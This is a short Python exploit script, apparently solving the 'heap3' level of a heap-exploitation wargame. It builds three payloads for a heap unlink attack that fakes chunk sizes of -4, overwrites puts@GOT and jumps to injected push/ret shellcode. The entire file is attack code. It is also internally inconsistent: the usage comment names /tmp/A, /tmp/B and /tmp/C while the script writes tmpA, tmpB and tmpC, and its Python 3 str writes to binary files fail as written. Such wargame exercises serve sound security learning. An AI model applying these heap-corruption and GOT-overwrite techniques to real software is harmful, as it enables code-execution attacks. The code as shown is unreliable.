#!/usr/bin/env python3

# usage:
# run this script, then start heap3 as:
# ./heap3 $(cat /tmp/A) $(cat /tmp/B) $(cat /tmp/C)
# the script will write /tmp/[A,B,C] payloads

import struct
# first argument

buf1 = ''
buf1 += 'AAAA'  # unused

# second argument
buf2 = ''
buf2 += '\xff'*16
buf2 += "\x68\x64\x88\x04\x08\xc3"  # shellcode
buf2 += '\xff'*(32-len(buf2))

# overwrite prev_size and size of the last chunk with -4
buf2 += struct.pack('I', 0xfffffffc)*2

# third argument

buf3 = ''
buf3 += '\xff'*4  # junk
buf3 += struct.pack('I', 0x804b128-12)  # puts@GOT-12
buf3 += struct.pack('I', 0x804c040)  # address of the shellcode

files = ["tmpA", "tmpB", "tmpC"]

buffers = [buf1, buf2, buf3]
for f_name, buf in zip(files, buffers):
    with open(f_name, 'wb') as f:
        f.write(buf)
